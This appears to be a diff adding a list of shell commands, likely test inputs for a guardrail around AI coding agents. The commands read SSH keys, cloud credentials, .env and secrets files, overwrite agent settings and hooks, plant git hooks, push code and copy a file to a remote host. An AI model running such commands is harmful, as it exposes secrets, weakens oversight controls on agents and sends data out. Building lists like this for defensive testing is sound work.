@@ -1,0 +1,15 @@
+cat .env
+cat ~/.ssh/id_rsa
+cat ~/.aws/credentials
+printenv
+cat /etc/passwd
+cat server.key
+cat terraform.tfstate
+cat secrets.json
+echo "override" > .claude/settings.json
+cp malicious.js .codex/hooks/pre-commit.js
+rm -rf .cursor/
+echo "hook" >> .git/hooks/pre-commit
+git push origin main
+gh pr create --title "test" --body "body"
+scp local-file.txt user@remote.example.com:/path/
